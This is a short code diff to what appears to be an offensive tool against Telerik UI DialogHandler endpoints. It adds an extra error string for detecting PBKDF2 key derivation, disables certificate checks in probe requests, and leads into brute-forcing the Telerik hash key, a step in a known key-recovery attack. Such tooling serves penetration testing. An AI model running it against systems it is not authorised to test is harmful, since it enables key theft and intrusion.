@@ -325,7 +325,7 @@ class DialogHandler:
         res = requests.post(self.url, data=KDF_probe_data, proxies=self.proxies, headers=self.headers, verify=False)
         resp_body = res.text
 
-        if "Exception of type 'System.Exception' was thrown" in resp_body:
+        if "Exception of type 'System.Exception' was thrown" in resp_body or "The cryptographic operation has failed!" in resp_body:
             self.key_derive_mode = "PBKDF2"
             print(
                 "Target is a newer version of Telerik UI without verbose error messages. Hash key and Encryption key will have to BOTH match. PBKDF2 key derivation is used."
@@ -338,7 +338,7 @@ class DialogHandler:
         elif "Invalid length for a Base-64 char array or string" in resp_body:
             return
         else:
-            print("Unexpected response encountered, aborting.")
+            print(f"Unexpected response encountered: [{resp_body}] aborting.")
             sys.exit()
 
         print("Target is a valid DialogHandler endpoint. Brute forcing Telerik Hash Key...")
